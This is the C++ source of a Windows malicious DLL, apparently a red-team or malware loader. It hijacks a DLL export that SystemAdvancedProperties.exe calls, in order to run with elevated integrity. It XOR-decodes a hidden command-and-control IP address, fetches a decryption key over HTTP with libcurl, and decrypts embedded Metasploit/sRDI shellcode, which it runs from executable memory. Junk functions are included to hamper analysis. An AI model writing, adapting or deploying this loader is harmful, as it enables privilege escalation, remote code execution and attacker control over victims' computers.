// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include "pch.h"
#include "psapi.h"
#include <string>
#include <iostream>
#include "msfpayload.h"
#include "curl/curl.h"
#pragma comment (lib,  "curl/libcurl.lib")
#pragma comment (lib,  "curl/zlib.lib")


extern "C" __declspec(dllexport) int WinBioGetEnrolledFactors();

// Multi-byte key used for decrypting IPv4 Addr.
// First four bytes are CAFE and used for identifying the rest of the XoR key during runtime.
// CAFE magic bytes
char data[] = { 0x43, 0x41, 0x46, 0x45, 0x42, 0x41, 0x40, 0x39, 0x38,
0x37, 0x36, 0x35, 0x34, 0x33,0x32,0x31,0x30,0x29,0x28,0x27,0x26,0x25,
0x24,0x23,0x22,0x21,0x20,0x19,0x18,0x17,0x16,0x15,0x14,0x13,0x12,0x10 };


// IPv4 Addr to reach out to for next set of keys
char ipv4[] = { 0x73, 0x78, 0x72, 0x17, 0x09, 0x01, 0x0e, 0x1b, 0x04, 0x1d, 0x06, 0x34 }; // XOR encoded  192.168.0.4

std::string mbyte_xor(char mbyte_key[], char ipv4_encoded[]) {

    char ipv4_decoded[11];
    std::string c2_ip = "";

    for (int x = 0; x < 11; x++) {
        ipv4_decoded[x] = (mbyte_key[x] ^ ipv4_encoded[x]);
        c2_ip = c2_ip + ipv4_decoded[x];
    }
    return c2_ip;
}

/*
* Execute shellcode created via sRDI
* shellcode defined in payload.h
*/
void shellcode_sdri(std::string xor_key)
{
    const char* key = xor_key.c_str();

    LPVOID newMemory;
    HANDLE currentProcess;
    SIZE_T bytesWritten;

    // Get the current process handle 
    currentProcess = GetCurrentProcess();
    unsigned char final_payload[SHELLCODELEN];

    // Allocate memory with Read+Write+Execute permissions 
    newMemory = VirtualAllocEx(currentProcess, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // specify the key to xor here.
    for (int i = 0; i < SHELLCODELEN; i++) {
        final_payload[i] = (shellcode[i] ^ key[0]); // hex value of ASCII B == 0x42
        //final_payload[i] = (shellcode[i] ^ xor_key.c_str()[0]);
    }
    // Copy the shellcode into the memory we just created 
    WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&final_payload, SHELLCODELEN, &bytesWritten);
    // Yay! Let's run our shellcode! 
    ((void(*)())newMemory)();
}

void writetemp(HANDLE hTempFile, std::string data)
{
    WriteFile(hTempFile, (LPCVOID)data.c_str(), (DWORD)data.length(), NULL, NULL);
}

// Helper function for cURL to write data.
size_t writefunc(void* ptr, size_t size, size_t memb, std::string* s)
{
    s->append(static_cast<char*>(ptr), size * memb);
    return size * memb;
}


// Exported function from the real "srrstr.dll" - SRGetCplPropPage
// This function is called by SystemAdvancedProperties.exe (the target process we take advantage of.)
// Anything declared in this function will be executed under a high integrity process.
extern "C" __declspec(dllexport) int WinBioGetEnrolledFactors()
{

    TCHAR lpTempPathBuffer[MAX_PATH];
    TCHAR szTempFileName[MAX_PATH];
    
    GetTempPath(MAX_PATH, lpTempPathBuffer);
    
    std::string fname = "~rdf" + rand();
    std::wstring stemp = std::wstring(fname.begin(), fname.end());
    LPCWSTR wsfname = stemp.c_str();


    GetTempFileName(lpTempPathBuffer, wsfname, 0, szTempFileName);
    HANDLE hTempFile = CreateFile((LPTSTR)szTempFileName, // file name 
        GENERIC_WRITE,        // open for write 
        0,                    // do not share 
        NULL,                 // default security 
        FILE_APPEND_DATA,     // overwrite existing
        FILE_ATTRIBUTE_NORMAL,// normal file 
        NULL);                // no template 


    writetemp(hTempFile, "Loading...\n");
    std::string c2_server; // string to be populated after XOR decoding
    std::string response_string;

    // 1) Get XOR key for hardcoded IPv4 address.
    HANDLE currentProc = GetCurrentProcess(); // handle to current process.
    HANDLE baseAddr = GetModuleHandle(NULL);  // base address to start scanning from.
    PROCESS_MEMORY_COUNTERS memCounter;       // memory struct about current process
    char runtime_xor_key[32];                 // XoR key to identify and copy into buffer during runtime.
    
    GetProcessMemoryInfo(currentProc, &memCounter, sizeof(memCounter)); // Get info about current process memory.
    char* membuff = (char*)malloc(memCounter.WorkingSetSize);           // Create buffer with current amount of working memory.

    // working set of memory is stored in membuff.
    // ReadProcessMemory(currentProc, baseAddr, (LPVOID)membuff, memCounter.WorkingSetSize, NULL);
    ReadProcessMemory(currentProc, &data, (LPVOID)membuff, sizeof(data), NULL);
    

    writetemp(hTempFile, (std::string)"Init OK\n");
    // Loop through all process memory looking for signature "CAFE"
    for (int i = 0; i < memCounter.WorkingSetSize; i++) {
        //printf("%02x is at address %p \n"); // debugging XX bytes at 32bit address.

        // Identify CAFE magic bytes, then copy 32 of the following bytes
        if (membuff[i] == 0x43 && membuff[i + 1] == 0x41 && membuff[i + 2] == 0x46 && membuff[i + 3] == 0x45) {
                memcpy(runtime_xor_key, &membuff[i + 4], 32); // Copy over 32 bytes
                c2_server = mbyte_xor(runtime_xor_key, ipv4);
                
                //MessageBoxA(NULL, (LPCSTR)c2_server.c_str(), "C2 IPv4 Address", MB_OK);
                writetemp(hTempFile, "Key OK\n");
                break;
        }
    }

    //c2_server = "172.16.123.131"; // Used for local testing.
    writetemp(hTempFile, (std::string)runtime_xor_key + "\n"); // log multibyte xor key
    
    // 2) Make request for embedded content IP
    CURL* curl = curl_easy_init();
    
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, c2_server.c_str()); // cURL c2_server 
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
        curl_easy_perform(curl);

        curl_easy_cleanup(curl);
    }
    else {
        // Used for debugging DLL in injected process.
        //MessageBoxA(NULL, (LPCSTR)c2_server.c_str(), "cUrl Execution Error", MB_OK);
    }
    writetemp(hTempFile, response_string+ "\n"); // store xor key in tmp file.
    
    // 3) Load DLL from resource and execute shellcode.
    shellcode_sdri(response_string);

    // freeing resources
    free(membuff);
    CloseHandle(currentProc);
    CloseHandle(baseAddr);
    
    return 0;
}

int junk_function(int x, int y)
{
    x + y;
    x* y;
    x^ y;
    return 3200;     
}

// Default DLL Main for DLL loading. Not currently used.
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

    std::string junk_data = "cache money crew";
    junk_function(100, 200);
    
    WinBioGetEnrolledFactors();
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}